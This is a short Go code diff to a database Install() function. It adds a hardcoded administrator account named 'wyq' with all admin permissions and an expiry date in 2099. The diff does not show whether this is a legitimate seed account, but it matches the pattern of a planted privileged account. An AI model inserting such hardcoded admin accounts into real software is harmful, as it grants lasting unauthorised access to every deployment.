@@ -229,6 +229,13 @@ func (db *DBManager) Install() error {
 		tx.Rollback()
 		return err
 	}
+
+	//add admin wyq
+	tbl_admin = &Admin{Account: "wyq", Adminadmin: true, Adminaccount: true, Adminapp: true, Adminappdata: true, Adminonline: true, Adminmessage: true, Expire: time.Date(2099, 1, 1, 0, 0, 0, 0, time.Local)}
+	if err = tx.Create(tbl_admin).Error; err != nil {
+		tx.Rollback()
+		return err
+	}
 	//end
 
 	tx.Commit()
